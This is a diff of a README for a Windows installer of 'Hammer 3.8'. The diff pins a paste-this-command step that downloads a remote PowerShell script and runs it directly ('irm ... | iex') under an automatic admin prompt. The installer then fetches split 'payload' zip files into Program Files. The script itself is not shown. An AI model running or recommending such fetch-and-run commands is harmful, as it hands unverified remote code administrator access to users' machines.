@@ -5,7 +5,7 @@ Branch: `Hammer-3.8-fixed-connection`
 Open **Windows PowerShell** (a UAC admin prompt will appear automatically) and paste:
 
 ```powershell
-irm https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@SCRIPTREV/install.ps1 | iex
+irm https://cdn.jsdelivr.net/gh/dvahana2424-web/hammerdeckydowngrade@5c36424/install.ps1 | iex
 ```
 
 Direct GitHub raw (alternate):
@@ -38,3 +38,6 @@ Payload mirrors: [GitHub Release v3.8-fixed-connection](https://github.com/dvaha
 The installer downloads payload files from the [v3.8-fixed-connection release](https://github.com/dvahana2424-web/hammerdeckydowngrade/releases/tag/v3.8-fixed-connection) first. If that fails, wait a few minutes and run the command again.
 
 Manual fallback: download `Hammer-3.8.zip.001` and `Hammer-3.8.zip.002` from the release page, concatenate them into `Hammer-3.8.zip`, then extract to `C:\Program Files (x86)\Hammer`.
+
+
+
